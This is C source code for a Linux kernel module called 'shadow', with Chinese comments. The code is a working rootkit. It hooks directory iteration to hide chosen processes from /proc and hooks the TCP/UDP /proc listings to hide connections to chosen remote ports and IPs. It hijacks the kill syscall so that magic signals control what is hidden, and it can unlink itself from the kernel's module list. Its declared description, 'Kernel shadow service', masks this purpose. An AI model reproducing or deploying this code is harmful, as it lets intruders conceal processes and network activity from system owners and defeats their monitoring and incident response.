#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/version.h>
#include <linux/kprobes.h>
#include <linux/dirent.h>
#include <linux/proc_fs.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/inet.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/spinlock.h>
#include <linux/uaccess.h>
#include <linux/string.h>
#include <linux/ctype.h>
#include <linux/seq_file.h>
#include <net/tcp.h>
#include <net/udp.h>

#include "shadow.h"

/* 定义递归保护变量 */
DEFINE_PER_CPU(int, shadow_recursion_guard) = 0;
EXPORT_PER_CPU_SYMBOL(shadow_recursion_guard);

/* 模块参数 */
static int self_hide = 0;
module_param(self_hide, int, 0644);

#define SIG_HIDE_PID 61
#define SIG_UNHIDE_PID 62
#define SIG_HIDE_PORT 63
#define SIG_UNHIDE_PORT 64
#define SIG_HIDE_IP 59
#define SIG_UNHIDE_IP 60

struct hide_item {
    struct list_head list;
    unsigned int value;
};

static LIST_HEAD(hide_pids);
static LIST_HEAD(hide_remote_ports);
static LIST_HEAD(hide_remote_ips);
static DEFINE_SPINLOCK(hide_lock);

/* 辅助函数：管理隐藏列表 */
static void add_to_list(struct list_head *head, unsigned int value) {
    struct hide_item *item;
    unsigned long flags;
    spin_lock_irqsave(&hide_lock, flags);
    list_for_each_entry(item, head, list) {
        if (item->value == value) {
            spin_unlock_irqrestore(&hide_lock, flags);
            return;
        }
    }
    item = kmalloc(sizeof(*item), GFP_ATOMIC);
    if (item) {
        item->value = value;
        list_add(&item->list, head);
    }
    spin_unlock_irqrestore(&hide_lock, flags);
}

static void del_from_list(struct list_head *head, unsigned int value) {
    struct hide_item *item, *tmp;
    unsigned long flags;
    spin_lock_irqsave(&hide_lock, flags);
    list_for_each_entry_safe(item, tmp, head, list) {
        if (item->value == value) {
            list_del(&item->list);
            kfree(item);
        }
    }
    spin_unlock_irqrestore(&hide_lock, flags);
}

static bool is_in_list(struct list_head *head, unsigned int value) {
    struct hide_item *item;
    bool found = false;
    unsigned long flags;
    spin_lock_irqsave(&hide_lock, flags);
    list_for_each_entry(item, head, list) {
        if (item->value == value) {
            found = true;
            break;
        }
    }
    spin_unlock_irqrestore(&hide_lock, flags);
    return found;
}

/* --- 进程隐藏逻辑 --- */

struct stealth_dir_context {
    struct dir_context ctx;
    struct dir_context *orig_ctx;
};

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
static bool stealth_actor(struct dir_context *ctx, const char *name, int len,
                         loff_t pos, u64 ino, unsigned int d_type)
#else
static int stealth_actor(struct dir_context *ctx, const char *name, int len,
                        loff_t pos, u64 ino, unsigned int d_type)
#endif
{
    struct stealth_dir_context *sctx = container_of(ctx, struct stealth_dir_context, ctx);
    unsigned int pid;

    if (len > 0 && isdigit(name[0])) {
        if (kstrtouint(name, 10, &pid) == 0) {
            if (is_in_list(&hide_pids, pid)) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
                return true;
#else
                return 0;
#endif
            }
        }
    }
    return sctx->orig_ctx->actor(sctx->orig_ctx, name, len, pos, ino, d_type);
}

static int (*real_iterate_shared)(struct file *, struct dir_context *);
static int (*real_iterate_dir)(struct file *, struct dir_context *);

static int fake_iterate_common(struct file *file, struct dir_context *ctx, 
                               int (*real_func)(struct file *, struct dir_context *))
{
    struct stealth_dir_context sctx = {
        .ctx.actor = stealth_actor,
        .orig_ctx = ctx,
    };
    int ret;

    if (!real_func) return -ENOSYS;

    if (file && file->f_path.dentry && file->f_path.dentry->d_sb &&
        strcmp(file->f_path.dentry->d_sb->s_type->name, "proc") == 0) {
        
        sctx.ctx.pos = ctx->pos;
        ret = real_func(file, &sctx.ctx);
        ctx->pos = sctx.ctx.pos;
        return ret;
    }
    return real_func(file, ctx);
}

static int fake_iterate_shared(struct file *file, struct dir_context *ctx)
{
    return fake_iterate_common(file, ctx, real_iterate_shared);
}

static int fake_iterate_dir(struct file *file, struct dir_context *ctx)
{
    return fake_iterate_common(file, ctx, real_iterate_dir);
}

/* --- 网络隐藏逻辑 --- */

static int (*real_tcp4_seq_show)(struct seq_file *seq, void *v);
static int (*real_udp4_seq_show)(struct seq_file *seq, void *v);

/* 
 * 核心修复：
 * 1. 使用 shadow_enter_atomic() 彻底杜绝递归
 * 2. 严格校验 v 指针
 */
static int fake_tcp4_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    struct sock *sk = v;

    if (!real_tcp4_seq_show) return -ENOSYS;

    /* 递归保护：如果已经在钩子中，直接调用原始函数并返回 */
    if (!shadow_enter_atomic()) {
        return real_tcp4_seq_show(seq, v);
    }

    if (v != SEQ_START_TOKEN && sk) {
        if (is_in_list(&hide_remote_ports, ntohs(sk->sk_dport)) ||
            is_in_list(&hide_remote_ips, sk->sk_daddr)) {
            ret = 0;
            goto out;
        }
    }

    ret = real_tcp4_seq_show(seq, v);

out:
    shadow_exit_atomic();
    return ret;
}

static int fake_udp4_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    struct sock *sk = v;

    if (!real_udp4_seq_show) return -ENOSYS;

    if (!shadow_enter_atomic()) {
        return real_udp4_seq_show(seq, v);
    }

    if (v != SEQ_START_TOKEN && sk) {
        if (is_in_list(&hide_remote_ports, ntohs(sk->sk_dport)) ||
            is_in_list(&hide_remote_ips, sk->sk_daddr)) {
            ret = 0;
            goto out;
        }
    }

    ret = real_udp4_seq_show(seq, v);

out:
    shadow_exit_atomic();
    return ret;
}

/* --- 信号劫持逻辑 --- */

static int (*real_kill)(struct pt_regs *regs);

static int fake_kill(struct pt_regs *regs)
{
    pid_t pid;
    int sig;

#if defined(CONFIG_X86_64)
    pid = (pid_t)regs->di;
    sig = (int)regs->si;
#elif defined(CONFIG_ARM64)
    pid = (pid_t)regs->regs[0];
    sig = (int)regs->regs[1];
#else
    return real_kill ? real_kill(regs) : -ENOSYS;
#endif

    switch (sig) {
        case SIG_HIDE_PID: add_to_list(&hide_pids, pid); return 0;
        case SIG_UNHIDE_PID: del_from_list(&hide_pids, pid); return 0;
        case SIG_HIDE_PORT: add_to_list(&hide_remote_ports, (unsigned int)pid); return 0;
        case SIG_UNHIDE_PORT: del_from_list(&hide_remote_ports, (unsigned int)pid); return 0;
        case SIG_HIDE_IP: add_to_list(&hide_remote_ips, (unsigned int)pid); return 0;
        case SIG_UNHIDE_IP: del_from_list(&hide_remote_ips, (unsigned int)pid); return 0;
    }

    return real_kill ? real_kill(regs) : -ENOSYS;
}

/* --- 钩子定义 --- */

static struct ftrace_hook hooks[] = {
    { .name = "iterate_shared", .function = fake_iterate_shared, .original = &real_iterate_shared },
    { .name = "iterate_dir", .function = fake_iterate_dir, .original = &real_iterate_dir },
    { .name = "tcp4_seq_show", .function = fake_tcp4_seq_show, .original = &real_tcp4_seq_show },
    { .name = "udp4_seq_show", .function = fake_udp4_seq_show, .original = &real_udp4_seq_show },
    { .name = "__x64_sys_kill", .function = fake_kill, .original = &real_kill },
    { .name = "__arm64_sys_kill", .function = fake_kill, .original = &real_kill },
    { .name = "sys_kill", .function = fake_kill, .original = &real_kill },
};

/* --- 模块自隐藏 --- */

static struct list_head *prev_module;

static void hide_module(void) {
    if (!THIS_MODULE) return;
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

/* --- 初始化与退出 --- */

typedef int (*ftrace_set_filter_ip_t)(struct ftrace_ops *ops, unsigned long ip, int remove, int reset);
typedef int (*register_ftrace_function_t)(struct ftrace_ops *ops);
typedef int (*unregister_ftrace_function_t)(struct ftrace_ops *ops);

static ftrace_set_filter_ip_t _ftrace_set_filter_ip;
static register_ftrace_function_t _register_ftrace_function;
static unregister_ftrace_function_t _unregister_ftrace_function;

static int __init shadow_init(void)
{
    int err;
    size_t i;

    _ftrace_set_filter_ip = (ftrace_set_filter_ip_t)lookup_name("ftrace_set_filter_ip");
    _register_ftrace_function = (register_ftrace_function_t)lookup_name("register_ftrace_function");
    _unregister_ftrace_function = (unregister_ftrace_function_t)lookup_name("unregister_ftrace_function");

    if (!_ftrace_set_filter_ip || !_register_ftrace_function || !_unregister_ftrace_function) {
        return -ENOENT;
    }

    for (i = 0; i < ARRAY_SIZE(hooks); i++) {
        struct ftrace_hook *hook = &hooks[i];
        hook->address = lookup_name(hook->name);
        if (!hook->address) continue;

        *((unsigned long*) hook->original) = hook->address;

        hook->ops.func = fh_ftrace_handler;
        hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
                        | FTRACE_OPS_FL_RECURSION
                        | FTRACE_OPS_FL_IPMODIFY;

        err = _ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
        if (!err) {
            err = _register_ftrace_function(&hook->ops);
            if (err) {
                _ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
                hook->address = 0;
            }
        } else {
            hook->address = 0;
        }
    }

    if (self_hide) hide_module();

    pr_info("shadow: Module loaded\n");
    return 0;
}

static void __exit shadow_exit(void)
{
    size_t i;
    struct hide_item *item, *tmp;
    unsigned long flags;

    for (i = 0; i < ARRAY_SIZE(hooks); i++) {
        struct ftrace_hook *hook = &hooks[i];
        if (hook->address && _unregister_ftrace_function && _ftrace_set_filter_ip) {
            _unregister_ftrace_function(&hook->ops);
            _ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        }
    }
    
    spin_lock_irqsave(&hide_lock, flags);
    list_for_each_entry_safe(item, tmp, &hide_pids, list) { list_del(&item->list); kfree(item); }
    list_for_each_entry_safe(item, tmp, &hide_remote_ports, list) { list_del(&item->list); kfree(item); }
    list_for_each_entry_safe(item, tmp, &hide_remote_ips, list) { list_del(&item->list); kfree(item); }
    spin_unlock_irqrestore(&hide_lock, flags);

    pr_info("shadow: Module unloaded\n");
}

module_init(shadow_init);
module_exit(shadow_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("GPL");
MODULE_DESCRIPTION("Linux LKM Kernel shadow service");